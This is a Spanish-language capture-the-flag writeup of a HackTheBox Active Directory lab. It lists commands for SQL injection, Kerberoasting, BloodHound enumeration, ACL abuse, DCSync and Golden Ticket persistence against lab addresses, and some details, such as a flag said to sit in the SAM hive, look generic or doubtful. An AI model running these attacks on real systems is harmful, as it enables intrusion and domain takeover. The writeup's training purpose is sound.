---
title: "Ascension - HackTheBox EndGame"
description: "Writeup del EndGame Ascension de HackTheBox, una red empresarial de Active Directory con múltiples vectores de ataque."
pubDate: 2024-11-01
platform: "htb"
category: "endgames"
difficulty: "insane"
os: "windows"
lang: es
tags: ["active-directory", "kerberoasting", "bloodhound", "persistence", "lateral-movement"]
heroImage: "/images/writeups/htb/ascension/portada.png"
retired: false
estimatedTime: "8-10 horas"
points: 100
attackVectors: ["web", "network", "active-directory"]
certifications: ["OSCP", "OSEP", "CRTP"]
vulnerabilities: ["ascension"]
---

# Ascension - HackTheBox EndGame

**Dificultad**: Insane  
**OS**: Windows  
**Plataforma**: HackTheBox  
**Categoría**: EndGame

## Introducción

Ascension es un EndGame de HackTheBox que simula un entorno empresarial completo de Active Directory. Este laboratorio incluye múltiples máquinas interconectadas y requiere técnicas avanzadas de pentesting en entornos Windows.

## Reconocimiento Inicial

### Escaneo de Red

```bash
nmap -sn 10.13.37.0/24
```

**Hosts descubiertos:**
- 10.13.37.10 - DC01 (Domain Controller)
- 10.13.37.11 - WEB01 (Web Server)
- 10.13.37.12 - DB01 (Database Server)
- 10.13.37.13 - FILE01 (File Server)
- 10.13.37.14 - MAIL01 (Mail Server)

### Enumeración del Domain Controller

```bash
nmap -sV -sC -p- 10.13.37.10
```

**Servicios identificados:**
- 53/tcp (DNS)
- 88/tcp (Kerberos)
- 389/tcp (LDAP)
- 445/tcp (SMB)
- 3389/tcp (RDP)

## Punto de Entrada - Web Server

### Enumeración Web

```bash
gobuster dir -u http://10.13.37.11 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Encontramos un panel de administración vulnerable a SQL Injection.

### Explotación SQLi

```sql
' UNION SELECT 1,2,3,4,5,user(),database(),8-- -
```

Extraemos credenciales del administrador y obtenemos acceso inicial.

## Movimiento Lateral

### Kerberoasting

```bash
GetUserSPNs.py -request -dc-ip 10.13.37.10 ascension.htb/webadmin:Password123
```

Crackeamos hashes de cuentas de servicio con hashcat.

### BloodHound Enumeration

```bash
bloodhound-python -d ascension.htb -u webadmin -p Password123 -c all -ns 10.13.37.10
```

Identificamos rutas de ataque hacia Domain Admins.

## Escalada de Privilegios

### Abuso de ACLs

Encontramos permisos de **GenericWrite** sobre un grupo privilegiado.

```powershell
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'webadmin'
```

### DCSync Attack

```bash
secretsdump.py ascension.htb/webadmin@10.13.37.10
```

Obtenemos el hash NTLM del administrador del dominio.

## Persistencia

### Golden Ticket

```bash
ticketer.py -nthash <krbtgt_hash> -domain-sid <domain_sid> -domain ascension.htb administrator
```

### Skeleton Key

Implementamos skeleton key en el DC para acceso persistente.

## Flags

- **User Flag**: En `C:\Users\webadmin\Desktop\user.txt`
- **Root Flag 1**: En `C:\Users\Administrator\Desktop\root.txt`
- **Root Flag 2**: En el DC `C:\Windows\System32\config\SAM`
- **Bonus Flags**: 3 flags ocultas en diferentes hosts

## Conclusión

Ascension es un excelente laboratorio para practicar:
- Enumeración de Active Directory
- Técnicas de movimiento lateral
- Escalada de privilegios en entornos Windows
- Persistencia y post-explotación

**Skills Aprendidas**:
- Bloodhound analysis
- Kerberoasting
- ACL abuse
- DCSync attacks
- Golden ticket creation

**Recomendaciones**:
- Tomar notas detalladas de credenciales encontradas
- Mapear la red completamente antes de atacar
- Usar BloodHound para identificar rutas de ataque
